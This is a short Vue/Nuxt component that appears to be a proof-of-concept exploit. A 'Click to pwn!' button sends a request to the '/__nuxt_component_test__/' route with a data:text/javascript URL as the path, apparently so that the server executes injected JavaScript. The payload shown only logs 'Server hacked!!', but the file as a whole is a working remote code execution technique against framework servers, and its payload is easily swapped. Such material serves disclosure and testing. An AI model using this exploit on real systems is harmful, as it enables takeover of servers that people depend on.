<template>
  <div>
    <button @click="pwn">Click to pwn!</button>
  </div>
</template>

<script setup lang="ts">
const pwn = async () => {
  const res = await useFetch(
    '/__nuxt_component_test__/?path=data:text/javascript,console.log("[!] Server hacked!!");'
  );
};
</script>
